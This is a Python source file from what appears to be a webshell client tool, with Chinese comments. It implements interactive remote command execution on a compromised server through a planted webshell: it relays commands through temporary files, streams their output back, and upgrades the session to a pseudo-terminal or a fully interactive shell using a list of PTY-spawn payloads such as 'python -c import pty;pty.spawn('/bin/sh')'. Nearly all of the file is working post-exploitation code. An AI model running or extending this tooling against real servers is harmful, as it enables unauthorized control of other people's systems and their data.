from api.exploit import WebshellExploit
from api import utils, logger, ioconfig, config
import json
import base64
import threading
import os
import importlib

class BaseShell:
    r'''基本的交互式shell，输入一条命令并获取结果， 每次命令执行都是独立的
    '''
    def __init__(self, exp:WebshellExploit):
        self.exp = exp
        self.running = False

    def cmdloop(self):
        logger.info("Simply execute commands without maintaining any state.Type `exit` or `Ctrl-C` to exit.")
        logger.warning("This shell is just a loop to execute the input commands, not a real interactive shell!")
        self.running = True
        try:
            while self.running:
                cmd = utils.input(">> ")
                if cmd:
                    if cmd.lower() == 'exit':
                        self.running = False
                        break
                    msg = self.exp.exec_command(cmd+" 2>&1")
                    if msg is None:
                        logger.error(f"Exec `{cmd}` failed!")
                        continue
                    print(msg.decode(self.exp.session.client.options.encoding, 'ignore'))
        except KeyboardInterrupt:
            pass

class NormalShell(BaseShell):
    r'''通过文件维持交互式shell的输入输出，需要webshell能够执行命令且能控制命令的输入输出流
    '''
    def __init__(self, exp:WebshellExploit, shell: str):
        super().__init__(exp)

        self.shell = shell

        self.out_file = self.exp.session.server_info['tmpdir'] + self.exp.session.server_info['sep'] + utils.randomstr(8)+"_out"
        self.in_file = self.exp.session.server_info['tmpdir'] + self.exp.session.server_info['sep'] + utils.randomstr(8)+"_in"
        self._lock = threading.Lock()
        self._verbose = 0

        self.last_recv = '' # 上次接收到的数据
    
    def close(self):# 清理生成的临时文件，使shell退出
        self._lock.acquire()
        if self.running:
            self.exp.evalfile("interact_normal/close", pwd=self.exp.session.state['pwd'], infile=self.in_file, outfile=self.out_file)
            logger.info("Shell has exit!")
            self.running = False
        self._lock.release()
    
    def writer(self, cmd: str):
        self._lock.acquire()
        self.last_recv = None # 写入命令前将上次接收内容置空
        self._lock.release()
        ret = self.exp.evalfile("interact_normal/writer", cmd=cmd, pwd=self.exp.session.state['pwd'], infile=self.in_file)
        ret = ret.data
        if ret is None:
            logger.error(f"Write cmd `{cmd}` failed!")
            return
        if ret == "-1":
            self.close()
    
    def reader(self):
        while self.running:
            self.exp.session.client.options.set_temp_option("timeout", 0)
            self.exp.session.client.options.set_temp_option("verbose", self._verbose)
            ret = self.exp.evalfile("interact_normal/reader", pwd=self.exp.session.state['pwd'], outfile=self.out_file)
            ret = ret.data
            if ret is None:
                continue
            ret = json.loads(ret)
            if ret['code'] == -1:
                break
            elif ret['code'] == 1:
                msg = base64.b64decode(ret['msg'].encode()).decode(self.exp.session.client.options.encoding, 'ignore')
                self._lock.acquire()
                self.last_recv = msg
                self._lock.release()
                print(msg, end="", flush=True)
        self.close()
    
    def start_shell(self):
        self.exp.session.client.options.set_temp_option("timeout", 0)
        self.exp.session.client.options.set_temp_option("verbose", self._verbose)
        ret = self.exp.evalfile("interact_normal/shell", shell=self.shell, pwd=self.exp.session.state['pwd'], infile=self.in_file, outfile=self.out_file)
        ret = ret.data
        if ret is None:
            logger.warning("Request `start_shell` has exit, if the shell is running normally please ignore the warning")
            return
        if ret == "-1":
            logger.error("Cannot run interactive shell!The remote server is missing a necessary component!")
        elif ret == "-2":
            logger.error("The interactive shell process failed to start!")
        self.close()
    
    def cmdloop(self):
        self.running = True
        start_thread = threading.Thread(target=self.start_shell)
        reader_thread = threading.Thread(target=self.reader)
        thread_list = [start_thread, reader_thread]
        start_thread.setDaemon(True)
        reader_thread.setDaemon(True)
        start_thread.start()
        utils.sleep(1)
        reader_thread.start()

        old_tty_setting = []
        try:
            if self.exp.session.isUnix():
                logger.info("You can type `:getpty` to get a pseudo terminal")
                if config.platform.startswith('linux'):
                    logger.info('You can type `:getfshell` to upgrade to a fully interactive shell')
            while self.running:
                cmd = utils.input()
                if not cmd:
                    continue
                if self.exp.session.isUnix():
                    if cmd == ':getpty':
                        self.get_pty()
                        continue
                    elif cmd == ':getfshell' and config.platform.startswith('linux'):
                        old_tty_setting = self.get_fully_shell()
                        continue
                self.writer(cmd)
        except KeyboardInterrupt:
            pass
        except BaseException as e:
            logger.error(e)
        
        if old_tty_setting:
            termios = importlib.import_module('termios')
            fd = ioconfig.stdin.fileno()
            termios.tcsetattr(fd, termios.TCSANOW, old_tty_setting)
        
        self.close()
        for t in thread_list:
            t.join(5)
            if t.is_alive():
                utils.kill_thread(t.ident)

    def get_fully_shell(self)-> list:
        '''获取完全交互式shell，仅支持Unix（服务器和本机）
        '''
        if self.get_pty():
            # 设置当前terminal
            termios = importlib.import_module('termios')
            tty = importlib.import_module('tty')
            fd = ioconfig.stdin.fileno()
            old = termios.tcgetattr(fd)
            new = old[:]
            new[3] &= ~termios.ECHO
            termios.tcsetattr(fd, termios.TCSANOW, new)
            tty.setraw(fd, termios.TCSANOW)

            while self.last_recv is None:# 若当前在执行命令则等待完成
                if not self.running:
                    return None
                utils.sleep(0.1)
            logger.info("Now you have acquired a fully interactive shell!", True)
            return old

        return None

    def get_pty(self)-> bool:
        '''获取半交互式shell,仅支持Unix（服务器）
        '''
        if self.exp.session.isWindows():
            return False
        while self.last_recv is None:# 若当前在执行命令则等待完成
            if not self.running:
                return False
            utils.sleep(0.1)
        self.writer("exec 2>&1")

        payloads = ["python -c \"import pty;pty.spawn('/bin/sh')\"", "python2 -c \"import pty;pty.spawn('/bin/sh')\"", 
                    "python3 -c \"import pty;pty.spawn('/bin/sh')\"", "script /dev/null"]
        for p in payloads:
            logger.info(f"Exec `{p}`...")
            self.writer(p)
            while self.last_recv is None:
                if not self.running:
                    return False
                utils.sleep(0.1)
            recv = self.last_recv.lower()
            if "modulenotfounderror" in recv or "not found" in recv:
                logger.error(f"Exec `{p}` failed!")
            else:
                rows = os.get_terminal_size().lines
                columns = os.get_terminal_size().columns
                term = os.environ.get('TERM', 'linux')
                self.writer(f'export TERM={term};export SHELL=sh;stty rows {rows} columns {columns};reset')
                while self.last_recv is None:
                    if not self.running:
                        return False
                    utils.sleep(0.1)
                logger.info("Now you have acquired a pty!", True)
                return True
        return False